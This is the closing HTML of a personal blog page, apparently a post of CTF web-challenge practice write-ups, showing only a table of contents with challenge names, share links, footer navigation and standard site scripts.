href="#%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%99%BE%E8%B6%8A%E6%9D%AF%E7%A6%8F%E5%BB%BA%E7%9C%81%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B"><span class="toc-number">3.</span> <span class="toc-text">第三届“百越杯”福建省高校网络空间安全大赛</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#do-you-know-upload"><span class="toc-number">3.1.</span> <span class="toc-text">Do you know upload？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9B"><span class="toc-number">4.</span> <span class="toc-text">2017第二届广东省强网杯线上赛</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#broken"><span class="toc-number">4.1.</span> <span class="toc-text">broken</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#who-are-you"><span class="toc-number">4.2.</span> <span class="toc-text">who are you</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&text=i春秋web刷题(持续更新)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&title=i春秋web刷题(持续更新)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&is_video=false&description=i春秋web刷题(持续更新)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=i春秋web刷题(持续更新)&body=Check out this article: http://example.com/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&title=i春秋web刷题(持续更新)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&title=i春秋web刷题(持续更新)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&title=i春秋web刷题(持续更新)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&title=i春秋web刷题(持续更新)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&name=i春秋web刷题(持续更新)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&t=i春秋web刷题(持续更新)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2025
    blacsheep
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
